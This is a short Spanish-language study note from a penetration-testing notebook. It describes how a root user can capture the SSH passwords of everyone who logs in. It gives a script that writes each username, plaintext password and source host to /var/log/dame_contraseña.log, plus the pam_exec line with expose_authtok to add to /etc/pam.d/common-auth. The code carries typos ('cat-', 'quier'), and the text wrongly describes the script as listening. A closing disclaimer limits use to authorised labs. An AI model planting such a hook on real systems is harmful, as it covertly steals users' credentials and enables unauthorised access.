---
title: "Recibir Credenciales SSH"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Una vez que seamos usuarios root de una máquina, podemos recibir credenciales de ssh de todos los usuarios que entren por SSH; y el proceso será el siguiente:

- PASO 1 - Crear un script llamado no.sh con el siguiente código, que si lo ejecutamos permanecerá a la escucha esperando para recibir credenciales del usuario:
```bash
echo "$(date) $PAM_USER, $(cat-), From: $PAM_RHOST" >> /var/log/dame_contraseña.log
```
![[Pasted image 20230503154621.png]]
- PASO 2 - Editamos el fichero /etc/pam.d/common-auth; y añadimos esta línea justo al final, donde hacemos el llamamiento al script que antes hemos creado:

```bash
auth optional pam_exec.so quier expose_authtok /home/mario/no.sh
```
![[Pasted image 20230503154804.png]]
Por tanto ahora simplemente ejecutamos el script no.sh y estará a la escucha esperando a recibir alguna conexión para enviarnos las credenciales de dicho usuario al fichero /var/log/dame_contraseña.log:
![[Pasted image 20230503154916.png]]
Y ahora si iniciamos sesión por ssh, habremos recibido las credenciales:
![[Pasted image 20230503154956.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
